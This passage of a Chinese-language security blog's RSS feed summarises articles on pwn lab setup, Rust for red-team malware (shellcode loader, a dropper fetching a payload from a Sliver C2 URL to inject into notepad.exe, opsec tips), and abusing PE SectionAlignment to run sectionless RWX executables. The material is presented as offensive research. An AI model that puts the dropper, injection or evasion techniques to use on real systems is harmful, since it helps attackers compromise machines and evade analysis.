完全防护环境（DEP+ASLR）&lt;br&gt;
要求：组合使用ROP与内存泄露技术&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;实验环境要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Workstation 12+&lt;/li&gt;
&lt;li&gt;Kali Linux虚拟机&lt;/li&gt;
&lt;li&gt;预装GDB-Peda/Pwndbg调试器&lt;/li&gt;
&lt;li&gt;Python Exploit开发套件&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Rust在恶意软件开发中的优势与实践</title>
        <link>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 21:49:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;rust在恶意软件开发中的应用&#34;&gt;Rust在恶意软件开发中的应用
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;作者分享了学习Rust进行恶意软件开发的经历，旨在提升模拟真实攻击的能力。Rust因其固有的反分析特性成为首选语言，能开发更具隐蔽性的工具。&lt;/p&gt;
&lt;h2 id=&#34;rust与c语言的对比分析&#34;&gt;Rust与C语言的对比分析
&lt;/h2&gt;&lt;p&gt;近年来，Go、Nim和Rust等语言在恶意软件作者中日益流行，主要基于两个假设：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这些语言编译的二进制文件比C/C++更难逆向分析&lt;/li&gt;
&lt;li&gt;非常规语言开发的恶意软件更容易绕过基于签名的检测机制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2023年罗切斯特理工学院的一项研究证实：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rust二进制文件显著大于C/C++版本&lt;/li&gt;
&lt;li&gt;自动化分析工具对Rust程序产生更多误报和漏报&lt;/li&gt;
&lt;li&gt;Ghidra和IDA Free等工具对Rust二进制文件的反编译效果较差&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实例分析shellcode加载器&#34;&gt;实例分析：Shellcode加载器
&lt;/h2&gt;&lt;p&gt;通过功能相同的Rust和C版shellcode加载器进行对比：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;Win32&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;THREAD_CREATION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;INFINITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Memory&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_PROTECTION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Foundation&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;CloseHandle&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;编译后，Rust程序(151.5KB)几乎是C程序(71.7KB)的两倍，这是因为Rust默认静态链接依赖项。&lt;/p&gt;
&lt;h2 id=&#34;ghidra逆向分析对比&#34;&gt;Ghidra逆向分析对比
&lt;/h2&gt;&lt;p&gt;Rust程序的反编译输出难以理解，原因包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Ghidra尝试将Rust反编译为伪C代码，但内存管理和优化差异导致难以理解&lt;/li&gt;
&lt;li&gt;rustc的编译优化导致函数边界模糊，汇编代码高度优化&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;相比之下，C程序的反编译输出与源代码高度一致。&lt;/p&gt;
&lt;h2 id=&#34;开发rust恶意软件投放器&#34;&gt;开发Rust恶意软件投放器
&lt;/h2&gt;&lt;p&gt;构建一个投放器演示，功能包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举目标进程以注入payload&lt;/li&gt;
&lt;li&gt;使用文件映射注入技术执行payload&lt;/li&gt;
&lt;li&gt;通过HTTPS部署Sliver C2框架&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关键代码模块：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;enumerate_processes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;remote_mapping_injection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;http_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sliver.nrcerne.com:8444/DULL_EQUIPMENT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http_client&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;get_payload_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 注入notepad.exe进程
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;操作安全考虑&#34;&gt;操作安全考虑
&lt;/h2&gt;&lt;p&gt;Rust会在二进制文件中包含绝对路径(用于调试)，因此需在匿名环境中编译以保护操作安全。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Rust是C/C++开发恶意软件的优秀替代方案。虽然Ghidra 11.0在反编译Rust二进制文件方面取得进步，但由于函数内联和编译优化，分析Rust程序仍然困难。更大的二进制文件也增加了分析时间成本。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bishopfox/rust-malware-example&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整代码示例可在GitHub获取&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用未公开特性伪造PE节区头部的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%89%B9%E6%80%A7%E4%BC%AA%E9%80%A0pe%E8%8A%82%E5%8C%BA%E5%A4%B4%E9%83%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 12:36:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%9C%AA%E5%85%AC%E5%BC%80%E7%89%B9%E6%80%A7%E4%BC%AA%E9%80%A0pe%E8%8A%82%E5%8C%BA%E5%A4%B4%E9%83%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;滥用未公开特性伪造pe节区头部&#34;&gt;滥用未公开特性伪造PE节区头部
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;在调试其他项目时，我偶然发现PE文件的特殊行为：当NT头中的SectionAlignment值小于页面大小(4096)时，镜像的内存映射方式会出现显著差异。加载器不会按常规方式解析节区表构造内存镜像，而是将整个文件（包括头部）以RWX权限映射到内存中 - 完全忽略单独的节区头部。&lt;/p&gt;
&lt;p&gt;这种特性使得我们可以创建不含任何节区但仍能执行自身代码的PE可执行文件。由于默认具有写权限，这些代码甚至可以实现自我修改。&lt;/p&gt;
&lt;h2 id=&#34;windows内核机制&#34;&gt;Windows内核机制
&lt;/h2&gt;&lt;p&gt;在MiCreateImageFileMap函数中可见PE头解析逻辑：当SectionAlignment小于0x1000时，系统会在映射镜像前设置未公开标志位(0x200000)：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionAlignment&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xC000007B&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;MiLogCreateImageFileMapFailure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v39&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v29&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DWORD1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ImageFailureReason&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_81&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;当该标志置位时，MiBuildImageControlArea将整个文件视为单个节区：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SectionFlags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x200000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SectionCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术验证&#34;&gt;技术验证
&lt;/h2&gt;&lt;h3 id=&#34;示例1无节区可执行pe&#34;&gt;示例1：无节区可执行PE
